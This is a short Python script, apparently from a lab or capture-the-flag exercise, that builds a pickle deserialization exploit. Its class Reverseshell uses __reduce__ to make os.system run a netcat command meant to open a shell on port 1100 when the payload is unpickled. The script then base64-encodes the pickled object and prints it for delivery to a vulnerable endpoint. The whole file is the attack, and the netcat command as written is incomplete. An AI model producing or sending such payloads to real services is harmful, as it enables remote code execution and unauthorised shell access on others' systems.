import pickle
import base64
import os


class Reverseshell:
    def __reduce__(self):
        return (os.system, ('netcat -e localhost 1100',))


serialized = pickle.dumps(Reverseshell())

encode = base64.urlsafe_b64encode(serialized).decode()

print(encode)